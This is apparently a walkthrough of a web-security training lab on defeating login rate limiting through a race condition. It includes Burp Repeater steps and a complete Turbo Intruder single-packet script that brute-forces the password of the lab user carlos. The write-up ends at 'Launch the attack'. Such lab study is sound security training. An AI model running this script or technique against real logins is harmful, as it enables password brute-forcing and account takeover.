Title: Bypassing rate limits via race conditions
Level: Practitioner
Desc:  This lab's login mechanism uses rate limiting to defend against brute-force attacks. However, this can be bypassed due to a race condition.
To solve the lab:

    Work out how to exploit the race condition to bypass the rate limit.
    Successfully brute-force the password for the user carlos.
    Log in and access the admin panel.
    Delete the user carlos.

You can log in to your account with the following credentials: wiener:peter.

You should use the following list of potential passwords: file

## Walkthrough
Install Turbo Intruder plugin: 
![image](https://github.com/user-attachments/assets/dd781ada-02e0-454c-8a58-57f502a30bbd)


I can see, that request to login supports HTTP/2
![image](https://github.com/user-attachments/assets/92898829-cf65-483f-bfc9-26a5932d5067)


Observation: after providing more than 3 incorrect passwords I get message: "You have made too many incorrect login attempts. Please try again in 58 seconds."

Observation: rate limiting is specific to user (login), I can still try to log in for another user account

Now I can deduce, that number of failed attempts can be stored on the server side. I can also assume, that could be race condition between sending request and incrementing number of failed attempts.

```
    From the proxy history, find a POST /login request containing an unsuccessful login attempt for your own account.

    Send this request to Burp Repeater.

    In Repeater, add the new tab to a group. For details on how to do this, see Creating a new tab group.
    Right-click the grouped tab, then select Duplicate tab. Create 19 duplicate tabs. The new tabs are automatically added to the group.

    Send the group of requests in sequence, using separate connections to reduce the chance of interference. For details on how to do this, see Sending requests in sequence.

    Observe that after two more failed login attempts, you're temporarily locked out as expected.
```
![image](https://github.com/user-attachments/assets/82455255-d856-4724-a1b9-4100492487ce)



```
    Send the group of requests again, but this time in parallel. For details on how to do this, see Sending requests in parallel

    Study the responses. Notice that although you have triggered the account lock, more than three requests received the normal Invalid username and password response.

    Infer that if you're quick enough, you're able to submit more than three login attempts before the account lock is triggered.
```
Observation: I managed to send all reqest and get response withouth rate limiting

## Exploitation
![image](https://github.com/user-attachments/assets/a58d41d4-28c9-4f56-a9b5-c9e7ef77cc14)


Still in Repeater, highlight the value of the password parameter in the POST /login request.

Right-click and select Extensions > Turbo Intruder > Send to turbo intruder.

In Turbo Intruder, in the request editor, notice that the value of the password parameter is automatically marked as a payload position with the %s placeholder.

Change the username parameter to carlos.

From the drop-down menu, select the examples/race-single-packet-attack.py template.

In the Python editor, edit the template so that your attack queues the request once using each of the candidate passwords. For simplicity, you can copy the following example:
```
def queueRequests(target, wordlists):

    # as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )
    
    # assign the list of candidate passwords from your clipboard
    passwords = wordlists.clipboard
    
    # queue a login request using each password from the wordlist
    # the 'gate' argument withholds the final part of each request until engine.openGate() is invoked
    for password in passwords:
        engine.queue(target.req, password, gate='1')
    
    # once every request has been queued
    # invoke engine.openGate() to send all requests in the given gate simultaneously
    engine.openGate('1')


def handleResponse(req, interesting):
    table.add(req)
```
Note that we're assigning the password list from the clipboard by referencing wordlists.clipboard. Copy the list of candidate passwords to your clipboard.

Launch the attack.


![image](https://github.com/user-attachments/assets/c70d0e8c-21b1-48db-8e49-e902a042b6d4)








